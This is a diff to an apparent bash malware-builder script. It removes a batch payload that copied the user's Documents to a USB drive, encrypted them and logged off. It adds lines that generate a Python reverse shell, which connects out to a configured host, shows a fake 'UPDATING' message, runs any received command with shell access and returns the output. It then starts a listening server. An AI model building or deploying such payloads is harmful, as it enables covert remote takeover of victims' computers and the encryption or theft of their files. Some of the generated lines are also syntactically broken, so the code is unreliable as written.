@@ -131,12 +131,33 @@ elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "5" ]];
 then
 
 #copy_docs_to_usb_malware_writer
-echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat
-echo "xcopy * J:">>output/$sec3.bat
-echo "cd C:/Users/%USERNAME%/Documents">>output/$sec3.bat
-echo "cipher /e *">>output/$sec3.bat
-echo "logoff">>output/$sec3.bat
+echo "import socket">output/$sec3.py
+echo "import subprocess">>output/$sec3.py
+echo "HOST = ">>output/$sec3.py
+echo "PORT = ">>output/$sec3.py
+echo "s = socket.socket()">>output/$sec3.py
+echo "s.connect((HOST, PORT))">>output/$sec3.py
+echo "msg2 = 'UPDATING DO NOT CLOSE!">>output/$sec3.py
+echo "msg = s.recv(1024).decode()">>output/$sec3.py
+echo "print('[*]log:', msg)">>output/$sec3.py
+echo "print(msg2)">>output/$sec3.py
+echo "while True">>output/$sec3.py
+echo "  cmd = s.recv(1024).decode()">>output/$sec3.py
+echo "  print(f'[*]log: {cmd}')">>output/$sec3.py
+echo "  if cmd.lower() == 'quit':">>output/$sec3.py
+echo "    break">>output/$sec3.py
+echo "  try:">>output/$sec3.py
+echo "    result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)">>output/$sec3.py
+echo "  except Exception as e:">>output/$sec3.py
+echo "    result = str(e).encode()">>output/$sec3.py
+echo "  if len(result) == 0:">>output/$sec3.py
+echo "    result = 'OK'.encode()">>output/$sec3.py
+echo "  s.send(result)">>output/$sec3.py
+echo "s.close()">>output/$sec3.py
+
 echo -e "${yellow}[+]Creating malware..."
+
+
 sleep 2
 
 
@@ -145,6 +166,9 @@ sleep 1
 
 echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"
 
+sleep 1
+echo -e "${cyan}[+]Status:Setting up Selay-server...${white}"
+python3 selay-server.py
 fi
 
 
